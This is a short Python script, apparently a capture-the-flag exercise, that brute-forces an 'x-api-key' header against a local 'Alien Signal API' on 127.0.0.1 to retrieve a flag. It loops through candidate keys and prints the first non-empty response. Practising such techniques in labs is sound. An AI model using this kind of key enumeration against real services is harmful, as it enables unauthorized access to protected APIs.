#
# Alien Signal API listening on http://127.0.0.1:8082
# Use HTTP GET with x-api-key header to get signal
# We have narrowed down the key to be in the range of 5500 to 5600

import urllib.request
import urllib.error
import urllib.parse

# This is the API key that we need to use to get the signal
# We're listening at http://127.0.0.1:8082
# You need to send an HTTP GET request with the correct x-api-key header.
# api_key is a number in the range 5500 to 5600

api_key_start = 5500

# This is the URL that we need to send the GET request to
url = "http://127.0.0.1:8082"

# This is the header that we need to send with the GET request
# The header is a dictionary with one key-value pair

for x in range(110):
    api_key = api_key_start + x
    print("Trying API key: " + str(api_key))
    headers = {"x-api-key": api_key}
    #try to send the request and succeed if we get a value != "" for key "flag"
    
    try:
        req = urllib.request.Request(url, headers=headers)
        response = urllib.request.urlopen(req)
        the_page = response.read()
        the_page = the_page.decode()
        if the_page != "":
            print(the_page)
            break
    except urllib.error.HTTPError as e:
        print("Error: " + str(e.code))
        print("Reason: " + str(e.reason))
        print("Headers: " + str(e.headers))
        print("URL: " + str(e.url))
        print("Data: " + str(e.data))